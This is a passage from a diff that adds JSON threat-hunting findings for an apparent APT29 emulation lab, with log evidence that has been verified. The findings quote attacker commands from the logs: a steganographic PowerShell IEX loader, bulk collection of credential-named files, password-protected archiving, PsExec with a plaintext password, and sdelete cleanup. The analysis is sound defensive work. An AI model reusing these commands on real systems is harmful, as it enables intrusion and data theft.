+          "id": "AaFZRvJfH5wFd7niytuv",
+          "field": "win.LogonType",
+          "claimed": "3",
+          "query_id": "q-4ffcea3e4d",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-846ac30166",
+            "q-4ffcea3e4d",
+            "q-a9456e8993",
+            "q-57d7b9d6bd",
+            "q-848f614b5e"
+          ],
+          "actual": "3",
+          "timestamp": "2020-05-01T23:10:23.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 6
+    },
+    {
+      "technique": "T1210",
+      "title": "Post-access interactive collection and RAR archiving on NASHUA via the remote shell",
+      "assessment": "malicious",
+      "confidence": "high",
+      "summary": "Immediately after the WinRM session opened, PowerShell script blocks on nashua.dmevals.local as pbeesly enumerate processes (Get-Process -IncludeUserName), then at 23:15:59 local time recursively collect documents, archives, password/login/admin/VPN-named files and images from the user profile and compress them with Compress-Archive, followed by '.\\Rar.exe a -hpfGzq5yKw \"$env:USERPROFILE\\Desktop\\working.zip\" \"$env:APPDATA\\working.zip\"' from C:\\Windows\\Temp at 23:16:19 and 'exit'. This is hands-on-keyboard activity on the newly reached host, consistent with staging data after remote-service access.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRC92",
+          "field": "win.ScriptBlockText",
+          "value": "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -De",
+          "query_id": "q-f8c4f2b0a6"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRC-J",
+          "field": "win.ScriptBlockText",
+          "value": ".\\Rar.exe a -hpfGzq5yKw \"$env:USERPROFILE\\Desktop\\working.zip\" \"$env:APPDATA\\working.zip\"",
+          "query_id": "q-f8c4f2b0a6"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qqQm-i",
+          "field": "win.ScriptBlockText",
+          "value": "cd C:\\Windows\\Temp",
+          "query_id": "q-f8c4f2b0a6"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRapX",
+          "field": "win.ScriptBlockText",
+          "value": " Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique ",
+          "query_id": "q-f8c4f2b0a6"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRC92",
+          "field": "win.ScriptBlockText",
+          "claimed": "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -De",
+          "query_id": "q-f8c4f2b0a6",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-f8c4f2b0a6",
+            "q-1fe9e2589a"
+          ],
+          "actual": "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\working.zip -Force",
+          "timestamp": "2020-05-01T23:15:59.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRC-J",
+          "field": "win.ScriptBlockText",
+          "claimed": ".\\Rar.exe a -hpfGzq5yKw \"$env:USERPROFILE\\Desktop\\working.zip\" \"$env:APPDATA\\working.zip\"",
+          "query_id": "q-f8c4f2b0a6",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-f8c4f2b0a6",
+            "q-7ba9ca4e2a"
+          ],
+          "actual": ".\\Rar.exe a -hpfGzq5yKw \"$env:USERPROFILE\\Desktop\\working.zip\" \"$env:APPDATA\\working.zip\"",
+          "timestamp": "2020-05-01T23:16:19.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qqQm-i",
+          "field": "win.ScriptBlockText",
+          "claimed": "cd C:\\Windows\\Temp",
+          "query_id": "q-f8c4f2b0a6",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-f8c4f2b0a6",
+            "q-9ec9659905"
+          ],
+          "actual": "cd C:\\Windows\\Temp",
+          "timestamp": "2020-05-01T23:16:10.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRapX",
+          "field": "win.ScriptBlockText",
+          "claimed": " Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique ",
+          "query_id": "q-f8c4f2b0a6",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c1952cb2f9",
+            "q-f8c4f2b0a6",
+            "q-d1a0283a9b"
+          ],
+          "actual": " Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique ",
+          "timestamp": "2020-05-01T23:09:28.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.powershell"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 4
+    },
+    {
+      "technique": "T1210",
+      "title": "Steganographic PowerShell loader (monkey.png) on SCRANTON — origin of the lateral movement",
+      "assessment": "malicious",
+      "confidence": "high",
+      "summary": "On scranton.dmevals.local at 2020-05-01 22:58:45 local (2020-05-02T02:58:46Z) a PowerShell 4104 script block as pbeesly decodes a bitmap C:\\Users\\pbeesly\\Downloads\\monkey.png into a byte array and executes it with IEX — a known APT29 steganography loader. This is the compromised host from which the WinRM connections to NASHUA (10.0.1.6) later originated, so it is the source of the remote-service access rather than a benign administrative script.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7q0Y_4v",
+          "field": "win.ScriptBlockText",
+          "value": "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))",
+          "query_id": "q-6327629e6d"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7q0Y_4v",
+          "field": "host.name",
+          "value": "scranton.dmevals.local",
+          "query_id": "q-6327629e6d"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7q0Y_4v",
+          "field": "win.ScriptBlockText",
+          "claimed": "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))",
+          "query_id": "q-6327629e6d",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c1952cb2f9",
+            "q-1810667bb6",
+            "q-6327629e6d",
+            "q-58850358bb",
+            "q-56ba1bdcc7"
+          ],
+          "actual": "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))",
+          "timestamp": "2020-05-01T22:58:45.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7q0Y_4v",
+          "field": "host.name",
+          "claimed": "scranton.dmevals.local",
+          "query_id": "q-6327629e6d",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c1952cb2f9",
+            "q-1810667bb6",
+            "q-6327629e6d",
+            "q-58850358bb",
+            "q-56ba1bdcc7"
+          ],
+          "actual": "scranton.dmevals.local",
+          "timestamp": "2020-05-01T22:58:45.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 2
+    },
+    {
+      "technique": "T1210",
+      "title": "Benign SMB/DC and machine-account network logons (10.0.0.4, 445, NEWYORK$/SCRANTON$/NASHUA$/UTICA$)",
+      "assessment": "benign",
+      "confidence": "medium",
+      "summary": "The bulk of port-445 traffic (66 connections overall, 26 to 10.0.0.4) was generated by process 'System' from all four hosts, and the 218 LogonType 3 events are dominated by machine accounts (NEWYORK$ 123, SCRANTON$ 37, NASHUA$ 25, UTICA$ 5) from loopback/link-local/DC addresses — normal domain authentication and SMB to the DC. The single RDP (3389) and 12 WinRM (5985) connections are not accompanied by exploitation artefacts; only the pbeesly WinRM session from SCRANTON to NASHUA is anomalous. Zeek (2020-04-30) does not overlap the Windows window and shows only 45 flows to 445 and 8 to 5985 with no exploitation indicators retrievable in this window.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "destination.ip",
+          "value": "10.0.1.6",
+          "query_id": "q-64cc0e0433"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7rxEjJI",
+          "field": "win.TargetUserName",
+          "value": "NEWYORK$",
+          "query_id": "q-a0c79eca9c"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "destination.ip",
+          "claimed": "10.0.1.6",
+          "query_id": "q-64cc0e0433",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ae21c33f08",
+            "q-809481db0a",
+            "q-a95c00adfc",
+            "q-c6c158acd1",
+            "q-4902e7de68"
+          ],
+          "actual": "10.0.1.6",
+          "timestamp": "2020-05-02T03:09:23.801Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7rxEjJI",
+          "field": "win.TargetUserName",
+          "claimed": "NEWYORK$",
+          "query_id": "q-a0c79eca9c",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c8c0123d26",
+            "q-a0c79eca9c",
+            "q-19941c84cc"
+          ],
+          "actual": "NEWYORK$",
+          "timestamp": "2020-05-01T22:56:47.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 2
+    },
+    {
+      "technique": "T1534",
+      "title": "PsExec lateral movement from SCRANTON to NASHUA using pbeesly's plaintext credentials, followed by python.exe C2 beaconing",
+      "assessment": "malicious",
+      "confidence": "high",
+      "summary": "On 2020-05-02 between 03:11:18Z and 03:15:03Z, user pbeesly on scranton.dmevals.local repeatedly launched Sysinternals PsExec64.exe from a PowerShell parent with the command line \"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe (4 executions). Each execution installed the PSEXESVC service on nashua.dmevals.local (7045 events at 23:11:39, 23:12:46, 23:13:49, 23:15:03 local time), produced a 4648 explicit-credential logon on NASHUA with Process Name C:\\Windows\\PSEXESVC.exe using pbeesly's credentials, and spawned C:\\Windows\\Temp\\python.exe as pbeesly under PSEXESVC.exe. That python.exe then made hundreds of outbound connections from nashua.dmevals.local to 192.168.0.4:8443 (348 sysmon event.code 3 records for that image), i.e. the same internal host that served all 62 HTTP requests in the zeek window. Earlier on SCRANTON, pbeesly's PowerShell also ran sdelete64.exe against C:\\programdata\\victim\\???cod.3aka3.scr, Draft.Zip, working.zip, SysinternalsSuite.zip and Rar.exe, indicating staging/anti-forensics around the same intrusion. This is attacker-driven remote execution and credential use across hosts, not normal administration.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.command_line",
+          "value": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-cd1a654ba3"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "host.name",
+          "value": "scranton.dmevals.local",
+          "query_id": "q-cd1a654ba3"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "win.ServiceName",
+          "value": "PSEXESVC",
+          "query_id": "q-51417f146b"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "host.name",
+          "value": "nashua.dmevals.local",
+          "query_id": "q-51417f146b"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNur",
+          "field": "win.ProcessName",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-48eefa2cf5"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNur",
+          "field": "win.TargetUserName",
+          "value": "pbeesly",
+          "query_id": "q-48eefa2cf5"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82OhP",
+          "field": "process.parent.executable",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-cd1a654ba3"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82OhP",
+          "field": "process.executable",
+          "value": "C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-cd1a654ba3"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c5ylrT",
+          "field": "destination.ip",
+          "value": "192.168.0.4",
+          "query_id": "q-17f7f4e966"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c5ylrT",
+          "field": "destination.port",
+          "value": "8443",
+          "query_id": "q-17f7f4e966"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hWVSlm",
+          "field": "process.command_line",
+          "value": "\"C:\\Program Files\\SysinternalsSuite\\sdelete64.exe\" /accepteula C:\\programdata\\victim\\???cod.3aka3.scr",
+          "query_id": "q-cd1a654ba3"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.command_line",
+          "claimed": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-cd1a654ba3",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-839fccd30f",
+            "q-dad3c51741",
+            "q-eedf0bc97a",
+            "q-da306f3cd9",
+            "q-9858c70456"
+          ],
+          "actual": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-02T03:11:18.784Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "host.name",
+          "claimed": "scranton.dmevals.local",
+          "query_id": "q-cd1a654ba3",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-839fccd30f",
+            "q-dad3c51741",
+            "q-eedf0bc97a",
+            "q-da306f3cd9",
+            "q-9858c70456"
+          ],
+          "actual": "scranton.dmevals.local",
+          "timestamp": "2020-05-02T03:11:18.784Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "win.ServiceName",
+          "claimed": "PSEXESVC",
+          "query_id": "q-51417f146b",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-9276a6f139",
+            "q-79877b0035",
+            "q-a392280f3a",
+            "q-938cf68f34",
+            "q-fe4a0971ab"
+          ],
+          "actual": "PSEXESVC",
+          "timestamp": "2020-05-01T23:11:39.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.other"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "host.name",
+          "claimed": "nashua.dmevals.local",
+          "query_id": "q-51417f146b",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-9276a6f139",
+            "q-79877b0035",
+            "q-a392280f3a",
+            "q-938cf68f34",
+            "q-fe4a0971ab"
+          ],
+          "actual": "nashua.dmevals.local",
+          "timestamp": "2020-05-01T23:11:39.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.other"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNur",
+          "field": "win.ProcessName",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-48eefa2cf5",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ac9203fe22",
+            "q-6cbeef0102",
+            "q-2d13c1540d",
+            "q-ae8cd475a2",
+            "q-14a9d1c2b2"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-01T23:11:40.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNur",
+          "field": "win.TargetUserName",
+          "claimed": "pbeesly",
+          "query_id": "q-48eefa2cf5",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ac9203fe22",
+            "q-6cbeef0102",
+            "q-2d13c1540d",
+            "q-ae8cd475a2",
+            "q-14a9d1c2b2"
+          ],
+          "actual": "pbeesly",
+          "timestamp": "2020-05-01T23:11:40.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82OhP",
+          "field": "process.parent.executable",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-cd1a654ba3",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-10e292fc55",
+            "q-6c06613c3e",
+            "q-a559b1e79c",
+            "q-cf1e6614b3",
+            "q-762b97d6aa"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-02T03:11:40.213Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82OhP",
+          "field": "process.executable",
+          "claimed": "C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-cd1a654ba3",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-10e292fc55",
+            "q-6c06613c3e",
+            "q-a559b1e79c",
+            "q-cf1e6614b3",
+            "q-762b97d6aa"
+          ],
+          "actual": "C:\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-02T03:11:40.213Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c5ylrT",
+          "field": "destination.ip",
+          "claimed": "192.168.0.4",
+          "query_id": "q-17f7f4e966",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-17f7f4e966",
+            "q-cfd9c2c67f",
+            "q-9a26c40d9b"
+          ],
+          "actual": "192.168.0.4",
+          "timestamp": "2020-05-02T03:15:05.142Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c5ylrT",
+          "field": "destination.port",
+          "claimed": "8443",
+          "query_id": "q-17f7f4e966",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-17f7f4e966",
+            "q-cfd9c2c67f",
+            "q-9a26c40d9b"
+          ],
+          "actual": 8443,
+          "timestamp": "2020-05-02T03:15:05.142Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hWVSlm",
+          "field": "process.command_line",
+          "claimed": "\"C:\\Program Files\\SysinternalsSuite\\sdelete64.exe\" /accepteula C:\\programdata\\victim\\???cod.3aka3.scr",
+          "query_id": "q-cd1a654ba3",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4552fa2386",
+            "q-762b97d6aa",
+            "q-cd1a654ba3",
+            "q-a1172f000c",
+            "q-4edda752cc"
+          ],
+          "actual": "\"C:\\Program Files\\SysinternalsSuite\\sdelete64.exe\" /accepteula C:\\programdata\\victim\\???cod.3aka3.scr",
+          "timestamp": "2020-05-02T03:02:04.324Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 11
+    },
+    {
+      "technique": "T1534",
+      "title": "No internal spearphishing (mail-borne lure) observed; PowerShell 4104 URL/mail hits are benign module manifests",
+      "assessment": "benign",
+      "confidence": "medium",
+      "summary": "The 10 PowerShell 4104 script blocks matching http/attachment/mail were reviewed: they are Microsoft DSC/xStorage module manifests, a PSSA suppression comment, a 7-Zip module manifest, and a PDQ-blog screen-capture function — no mail client, attachment, or internal phishing content. windows.other event.code 1/11 hits are Hyper-V NIC restarts, time-change and filter-unload messages, not lure-opened documents. No 4625 failed logons were observed (C086 zero hits). The zeek window (2020-04-30) does not overlap the Windows window (2020-05-02), so no mail/web delivery could be correlated; the internal host 192.168.0.4 served all 62 HTTP requests in the zeek window, but no phishing content was visible in the retrieved events.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qvSyuh",
+          "field": "process.command_line",
+          "value": "function Invoke-ScreenCapture",
+          "query_id": "q-8dcf263055"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qwT1sV",
+          "field": "user.name",
+          "value": "SYSTEM",
+          "query_id": "q-8dcf263055"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuBw",
+          "field": "message",
+          "value": "Miniport NIC 'Microsoft Hyper-V Network Adapter' restarted",
+          "query_id": "q-0485eeb629"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qvSyuh",
+          "field": "process.command_line",
+          "claimed": "function Invoke-ScreenCapture",
+          "query_id": "q-8dcf263055",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-8dcf263055",
+            "q-e3961167cc"
+          ],
+          "actual": "function Invoke-ScreenCapture\n# https://www.pdq.com/blog/capturing-screenshots-with-powershell-and-net/\n{\n    Start-Job -Name \"Screenshot\" -ScriptBlock { \n        Write-Host \"`nJobPID`n------`n$PID\"\n        while($true){\n            $RandomFileName = [System.IO.Path]::GetRandomFileName(); \n            $Filepath=\"$env:USERPROFILE\\Downloads\\$RandomFileName.bmp\"; \n            Add-Type -AssemblyName System.Windows.Forms; \n            Add-type -AssemblyName System.Drawing; \n            $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; \n            $Width = $Screen.Width; \n         ...(truncated)",
+          "timestamp": "2020-05-01T23:05:53.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qwT1sV",
+          "field": "user.name",
+          "claimed": "SYSTEM",
+          "query_id": "q-8dcf263055",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c1952cb2f9",
+            "q-8dcf263055",
+            "q-9bf0e48d35"
+          ],
+          "actual": "SYSTEM",
+          "timestamp": "2020-05-01T23:01:30.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuBw",
+          "field": "message",
+          "claimed": "Miniport NIC 'Microsoft Hyper-V Network Adapter' restarted",
+          "query_id": "q-0485eeb629",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-0485eeb629",
+            "q-446f51e628",
+            "q-a655feb4bc"
+          ],
+          "actual": "Miniport NIC 'Microsoft Hyper-V Network Adapter' restarted",
+          "timestamp": "2020-05-01T23:02:46.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.other"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 3
+    },
+    {
+      "technique": "T1550",
+      "title": "PsExec lateral movement from SCRANTON to NASHUA using explicit plaintext credentials for pbeesly",
+      "assessment": "malicious",
+      "confidence": "high",
+      "summary": "On 2020-05-02 between 03:11:18Z and 03:15:03Z, user pbeesly on scranton.dmevals.local repeatedly launched C:\\Program Files\\SysinternalsSuite\\PsExec64.exe with the command line \"PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe (four executions: 03:11:18, 03:12:25, 03:13:28, 03:14:42). Each attempt produced a matching 4648 explicit-credential logon on scranton targeting server NASHUA, a PSEXESVC service installation (7045) on nashua.dmevals.local, a PSEXESVC.exe process creation on nashua running as SYSTEM, and a 4648 on nashua from C:\\Windows\\PSEXESVC.exe. This is credential-based remote execution/lateral movement to a second host. The same account also ran Invoke-Command -ComputerName NASHUA from scranton at 03:09:23Z, and later used sdelete64.exe on nashua (03:16:52-03:17:41Z) to securely delete Rar.exe and working.zip, indicating anti-forensic cleanup on the target. Note: the credentials were supplied in cleartext (-u/-p), so this is use of known valid credentials rather than reuse of stolen hash/ticket material.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.command_line",
+          "value": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-4edda752cc"
+        },
